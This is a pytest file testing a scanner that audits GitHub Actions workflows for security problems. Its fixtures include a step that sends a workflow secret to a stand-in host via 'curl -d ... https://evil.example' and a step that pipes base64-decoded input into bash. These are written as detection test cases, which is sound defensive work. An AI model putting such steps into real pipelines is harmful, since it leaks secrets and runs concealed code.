# tests/test_workflow_scan.py
from pathlib import Path
from credence.workflow_audit.scan import scan


def _mk(tmp_path, rel, content):
    p = tmp_path / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content)


def test_scan_working_tree_returns_dict_findings(tmp_path):
    _mk(tmp_path, ".github/workflows/ci.yml",
        "on: push\njobs:\n  b:\n    runs-on: x\n    env:\n      T: ${{ secrets.P }}\n"
        "    steps:\n      - run: curl -d \"$T\" https://evil.example\n")
    findings = scan(tmp_path, history=False)
    assert isinstance(findings, list) and isinstance(findings[0], dict)
    assert findings[0]["severity"] in ("HIGH", "CRITICAL")
    assert findings[0]["fingerprint"]            # populated


def test_scan_unparseable_workflow_emits_fail_loud_finding(tmp_path):
    _mk(tmp_path, ".github/workflows/bad.yml", "on: [push\n  : : :\n")
    findings = scan(tmp_path, history=False)
    assert any(f["rule_id"] == "WF-PARSE-001" and f["severity"] == "HIGH"
               for f in findings)


def test_scan_fingerprints_are_stable_and_unique(tmp_path):
    _mk(tmp_path, ".github/workflows/ci.yml",
        "on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n"
        "      - run: echo x | base64 -d | bash\n")
    a = scan(tmp_path, history=False)
    b = scan(tmp_path, history=False)
    assert [f["fingerprint"] for f in a] == [f["fingerprint"] for f in b]
